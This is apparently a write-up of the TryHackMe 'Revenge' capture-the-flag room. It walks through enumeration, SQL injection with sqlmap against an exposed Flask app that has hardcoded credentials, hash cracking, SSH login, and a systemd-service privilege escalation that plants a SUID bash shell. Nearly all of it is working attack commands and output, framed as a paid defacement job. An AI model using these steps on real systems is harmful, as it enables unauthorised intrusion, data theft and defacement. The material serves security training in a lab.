# [Revenge](https://tryhackme.com/room/revenge)

## You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

# Message from Billy Joel

## Billy Joel has sent you a message regarding your mission. Download it, read it and continue on.

```
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.
Half up-front and half when you finish.

Good luck,

Billy
```

# Revenge!

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

### flag1

1. Start by performing a service version scan using nmap to identify open ports and running services on the target machine.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Use gobuster to discover hidden directories and files on the web server.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50
```

**Results:**

```
/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/static               (Status: 301) [Size: 194] [--> http://<TARGET_IP>/static/]
/admin                (Status: 200) [Size: 4983]
/requirements.txt     (Status: 200) [Size: 258]
```

3. Navigate to `http://<TARGET_IP>/requirements.txt` to view the Python dependencies used by the application.

**Results:**

```
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

4. Scan again looking for Python source files (`.py`) that might be accidentally exposed.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x py -t 50
```

**Results:**

```
/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://<TARGET_IP>/static/]
/app.py               (Status: 200) [Size: 2371]
```

5. Access `http://<TARGET_IP>/app.py` to download the application source code.

```python
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')


# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')


# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')


# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')


# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')


# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')


# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500


if __name__ == "__main__":
    app.run('0.0.0.0')
```

6. Use sqlmap to automatically exploit the SQL injection vulnerability and enumerate databases.

```bash
sqlmap -u "http://<TARGET_IP>/products/1" --dbs --batch
```

**Results:**

```
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

7. Dump the table structure from the `duckyinc` database.

```bash
sqlmap -u "http://<TARGET_IP>/products/1" -D duckyinc --tables --batch
```

**Results:**

```
Database: duckyinc
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```

8. The first flag is hidden in the `credit_card` column of the `user` table. Dump all user data.

```bash
sqlmap -u "http://<TARGET_IP>/products/1" -D duckyinc -T user --dump --batch
```

**Results:**

```
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{b*******_***_*******g} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
```

---

### flag2

1. Dump the `system_user` table to find administrator credentials that might grant SSH access.

```bash
sqlmap -u "http://<TARGET_IP>/products/1" -D duckyinc -T system_user --dump --batch
```

```
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
```

2. Copy the `server-admin` hash to a file and use John the Ripper to crack it against the rockyou wordlist.

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

3. Use the cracked credentials to establish an SSH connection to the target server.

```bash
ssh server-admin@<TARGET_IP>
# Password: inuyasha
```

4. Locate and read the second flag file in the user's home directory.

```bash
cat flag2.txt
```

<img width="307" height="80" alt="SCREEN01" src="https://github.com/user-attachments/assets/73262c45-eeeb-4fd1-b560-890d46d8941a" />

---

### flag3

_Mission objectives_

1. Check what sudo privileges the `server-admin` user has.

```bash
sudo -l
```

**Results:**

```
(root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service,
    /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

2. Edit the systemd service file to inject our malicious payload.

```bash
sudoedit /etc/systemd/system/duckyinc.service
```

3. Replace the service file content with a configuration that executes our script as root.

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/shell.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

4. Create a bash script that creates a SUID shell, granting us root privileges.

```bash
echo -e "cp /bin/bash /tmp/sh\nchmod +s /tmp/sh" > /tmp/shell.sh && chmod +x /tmp/shell.sh
```

5. Reload the systemd configuration and restart the service to execute our payload.

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

6. Execute the SUID bash binary with the `-p` flag to preserve privileges.

```bash
/tmp/sh -p
```

7. Navigate to the website's template directory and modify any line of the main index page to complete our mission.

```bash
nano /var/www/duckyinc/templates/index.html
```

8. Retrieve the third and final flag from the root directory.

```bash
cat /root/flag3.txt
```

<img width="415" height="147" alt="SCREEN02" src="https://github.com/user-attachments/assets/7f2a451a-f43f-400c-b13d-0d8ee815f154" />
